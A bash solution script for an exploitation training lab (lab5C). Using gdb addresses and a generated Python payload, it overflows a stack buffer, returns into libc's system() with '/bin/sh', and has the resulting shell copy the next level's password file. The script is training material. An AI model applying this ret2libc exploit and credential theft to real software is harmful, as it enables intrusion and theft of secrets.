#!/bin/bash

###############################
##  Exploit for level lab5C  ##
###############################

#   Exploitation: The goal of this level is to use ROP to call system()
# and gain a shell.

# libc is included so we have to find the location of system() in memory.
# gdb can tells us where it is located.

sysaddr=$(gdb --batch -ex "b main" -ex "r" -ex "print system" /levels/lab05/lab5C | 
          tail -n1 | grep -oP "(0x[0-9a-f]+)")

# Same thing for /bin/sh since we want to pass it to system()
shaddr=$(gdb --batch -ex "b main" -ex "r" -ex  "find /bin/sh" /levels/lab05/lab5C |
         tail -n1 | grep -oP "(0x[0-9a-f]+)")

if [ "$sysaddr" = "" ] || [ "$shaddr" = "" ]; then
    echo "[!] Fatal error: system() or /bin/sh address couldn't be found. Aborting..."
fi

# Now we can exploit the buffer overflow bug in copytoglobal() to gain
# control of eip and jump to system().

# This python script will craft the string to prepare the stack
cat > /tmp/.exploit.py << EOF
import struct
import sys

system = struct.pack('<I', int(sys.argv[1], 16))
sh     = struct.pack('<I', int(sys.argv[2], 16))

pad = 'A' * (0x9c)  # Because the buffer is at [ebp-0x98]
adj = 'A' * 4       # 4 bytes to adjust the function argument
print pad + system + adj + sh
EOF

# Password will be saved in /tmp/lab5C.pass
passfile="/tmp/lab5B.pass"

# Time to exploit the level
(python /tmp/.exploit.py $sysaddr $shaddr; echo "cat /home/lab5B/.pass > $passfile";) | /levels/lab05/lab5C
echo "[+] Password saved in $passfile"

# Clean-up
echo "Cleaning-up..."
rm -f /tmp/.exploit.py

